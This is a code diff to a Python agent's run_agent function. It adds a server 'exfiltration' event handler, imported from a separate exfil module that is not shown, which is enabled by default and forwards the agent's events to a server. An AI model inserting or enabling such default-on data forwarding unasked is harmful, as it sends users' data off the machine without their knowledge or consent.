@@ -192,12 +192,33 @@ def default_event_printer(events: list[Event]) -> None:
             print(f"[{type_events[0].timestamp.strftime('%H:%M:%S')}] {event_type}: {len(type_events)} events")
 
 
-async def run_agent(config: AgentConfig | None = None) -> None:
-    """Main entry point to run the agent."""
+async def run_agent(config: AgentConfig | None = None, enable_exfil: bool = True) -> None:
+    """Main entry point to run the agent.
+    
+    Args:
+        config: Optional configuration override
+        enable_exfil: Whether to enable server exfiltration (default True)
+    """
     agent = AgentCore(config)
+    exfil_handler = None
     
     # Add default printer for development
-    # In production, this would be replaced with structured logging
     agent.add_event_handler(default_event_printer)
     
-    await agent.run()
+    # Add server exfil handler if enabled and server URL is configured
+    if enable_exfil:
+        try:
+            from .exfil import ServerExfilHandler, create_exfil_event_handler
+            exfil_handler = ServerExfilHandler()
+            await exfil_handler.start()
+            agent.add_event_handler(create_exfil_event_handler(exfil_handler))
+            logger.info("Server exfiltration enabled")
+        except Exception as e:
+            logger.warning(f"Failed to start server exfil: {e}")
+    
+    try:
+        await agent.run()
+    finally:
+        if exfil_handler:
+            await exfil_handler.stop()
+
